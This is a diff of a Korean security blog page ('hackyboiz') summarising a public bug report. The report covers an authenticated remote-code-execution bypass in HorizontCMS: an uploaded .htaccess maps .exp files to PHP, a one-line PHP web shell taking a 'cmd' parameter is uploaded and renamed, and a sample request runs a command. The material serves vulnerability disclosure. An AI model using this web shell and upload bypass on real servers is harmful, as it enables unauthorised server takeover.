@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      200 자
+      415 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      8
        분
     </span>
   
@@ -240,28 +240,28 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb">[BugHunt] Authenticated RCE found in HorizontCMS — Part 2 (PHP Filetype Bypass)</a></p>
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb">[BugHunt] Authenticated RCE found in HorizontCMS &#x2014; Part 2 (PHP Filetype Bypass)</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>HorizontCMS</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 컨텐츠 관리 시스템인 HorizontCMS에서 기존 파일 업로드 취약점(CVE-2020–27387) 패치에 대한 우회가 발견되어 세부 정보가 공개되었습니다.</p>
-<p>기존 파일 업로드 취약점은 <code>.php</code>, <code>.php5</code>, <code>.php7</code>, <code>.phtml</code>, <code>.inc</code> 와 같은 확장명이 포함된 파일 업로드를 제한하는 것으로 패치되었지만 설정 파일인 <code>.htaccess</code> 필터링을 하지 않아 PHP file type을 변경한 우회 공격이 가능합니다.</p>
-<p>해당 취약점을 이용해 임의 코드를 실행하는 방법은 다음과 같습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCEE8;&#xD150;&#xCE20; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; HorizontCMS&#xC5D0;&#xC11C; &#xAE30;&#xC874; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xCDE8;&#xC57D;&#xC810;(CVE-2020&#x2013;27387) &#xD328;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xC6B0;&#xD68C;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xAE30;&#xC874; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>.php</code>, <code>.php5</code>, <code>.php7</code>, <code>.phtml</code>, <code>.inc</code> &#xC640; &#xAC19;&#xC740; &#xD655;&#xC7A5;&#xBA85;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC778; <code>.htaccess</code> &#xD544;&#xD130;&#xB9C1;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; PHP file type&#xC744; &#xBCC0;&#xACBD;&#xD55C; &#xC6B0;&#xD68C; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li>admin 페이지의 Media → Files에서 <code>test2.htaccess</code> 파일을 업로드합니다. 해당 파일의 내용은 아래와 같습니다.<ul>
+<li>admin &#xD398;&#xC774;&#xC9C0;&#xC758; Media &#x2192; Files&#xC5D0;&#xC11C; <code>test2.htaccess</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.<ul>
 <li><code>AddType application/x-httpd-php .exp</code></li>
 </ul>
 </li>
-<li>파일 rename 기능을 이용해 <code>test2.htaccess</code> 파일의 이름을 <code>.htaccess</code>로 변경합니다.</li>
-<li>아래와 같이 임의 코드를 실행할 수 있게 해주는 내용이 포함된 <code>test2.php</code> 파일을 업로드 한 뒤 파일 이름을 <code>test.exp</code> 로 변경합니다.<ul>
-<li><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li>
+<li>&#xD30C;&#xC77C; rename &#xAE30;&#xB2A5;&#xC744; &#xC774;&#xC6A9;&#xD574; <code>test2.htaccess</code> &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; <code>.htaccess</code>&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</li>
+<li>&#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>test2.php</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC; &#xD55C; &#xB4A4; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; <code>test.exp</code> &#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.<ul>
+<li><code>&lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;</code></li>
 </ul>
 </li>
-<li>1, 2에서 업로드한 <code>.htaccess</code> 로 인해 <code>.exp</code> 확장자가 php로 실행됩니다. 따라서 <code>test.exp</code>에 접근해 임의 코드를 실행할 수 있습니다.</li>
+<li>1, 2&#xC5D0;&#xC11C; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; <code>.htaccess</code> &#xB85C; &#xC778;&#xD574; <code>.exp</code> &#xD655;&#xC7A5;&#xC790;&#xAC00; php&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>test.exp</code>&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li>
 </ol>
 <pre><code class="hljs cpp">http:<span class="hljs-comment">//&lt;HorizontCMS IP&gt;/storage/test.exp?cmd=id</span></code></pre>
 
-<p>취약점 제보자는 악성 플러그인을 악용한 원격 코드 실행 취약점의 관련 정보 또한 공개하였으며 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe</a> 에서 확인할 수 있습니다.</p>
+<p>&#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4;&#xC790;&#xB294; &#xC545;&#xC131; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAD00;&#xB828; &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xACF5;&#xAC1C;&#xD558;&#xC600;&#xC73C;&#xBA70; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -564,6 +564,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
